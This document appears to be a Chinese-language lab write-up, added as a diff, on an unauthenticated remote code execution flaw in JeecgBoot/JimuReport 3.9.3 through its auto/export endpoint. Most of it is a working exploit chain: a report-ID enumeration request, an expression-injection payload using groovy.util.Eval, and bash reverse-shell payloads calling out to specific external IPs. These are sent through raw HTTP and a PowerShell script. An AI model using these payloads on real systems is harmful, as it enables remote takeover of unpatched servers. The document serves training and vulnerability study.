@@ -1,0 +1,83 @@
+---
+title: 1. 积木报表 JeecgBoot 3.9.3 pre-auth RCE
+sidebar_position: 1
+---
+
+# 积木报表 JeecgBoot 3.9.3 pre-auth RCE
+
+本篇记录 Ulab Web 靶场 CVE 专题的第一个漏洞：JeecgBoot（集成积木报表 JimuReport）低版本存在的未授权 RCE，从枚举报表 ID、命令执行到反弹 Shell 的完整利用过程。
+
+## 一、漏洞概述
+
+- **组件**：JeecgBoot + JimuReport（积木报表）低版本（目标 ≈ v3.9.3）
+- **接口**：`POST /jeecg-boot/jmreport/auto/export`
+- **根因**：`auto/export` 标注 `@JimuNoLoginRequired`（匿名放行），`reportParams[].params` 的值以 `=` 开头时，代码删除等号后交给 Aviator 表达式引擎执行。Aviator 仅禁用了 `NewInstance`，`use` + 静态方法仍可用，`groovy.util.Eval` 在 classpath 上，可拉起操作系统进程。
+- **影响**：未授权 RCE（以 JeecgBoot 进程用户权限执行命令）
+
+## 二、完整利用链
+
+### 1. 枚举报表 ID（无需任何权限）
+
+```
+GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10
+```
+
+返回 JSON 数组，取任意一条 `records[].id`。本次使用 `907480464532770816`（主子报表循环块），其他内置报表 ID 同样可用。
+
+### 2. 命令执行（RCE 验证，回显命令输出）
+
+```
+POST /jeecg-boot/jmreport/auto/export
+Host: <target>
+Content-Type: application/json
+Accept: application/json
+
+{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"id\"].execute().text')"},"exportType":"pdf"}]}
+```
+
+### 3. 反弹 Shell
+
+先在 VPS 上监听：
+
+```
+nc -lvnp 9001
+```
+
+```
+POST /jeecg-boot/jmreport/auto/export
+Host: <target>
+Content-Type: application/json
+Accept: application/json
+
+{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"bash\",\"-c\",\"bash -i >& /dev/tcp/43.154.18.23/9001 0>&1\"].execute()')"},"exportType":"pdf"}]}
+```
+
+## 三、PowerShell 发包（Windows 环境）
+
+```
+$body = @'
+{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"bash\",\"-c\",\"bash -i >& /dev/tcp/124.156.114.194/9001 0>&1\"].execute()')"},"exportType":"pdf"}]}
+'@
+
+Invoke-RestMethod -Uri 'http://ulab.bdziyi.cn:20090/jeecg-boot/jmreport/auto/export' `
+                  -Method Post `
+                  -ContentType 'application/json' `
+                  -Headers @{Accept='application/json'} `
+                  -Body $body
+```
+
+## 四、发包格式（原始 HTTP 请求）
+
+```
+POST /jeecg-boot/jmreport/auto/export HTTP/1.1
+Host: ulab.bdziyi.cn:20090
+Content-Type: application/json
+Accept: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 180
+
+{"reportParams":[{"id":"907480464532770816","params":{"x":"=use groovy.util.Eval; Eval.me('[\"bash\",\"-c\",\"bash -i >& /dev/tcp/43.129.194.209/9001 0>&1\"].execute()')"},"exportType":"pdf"}]}
+```
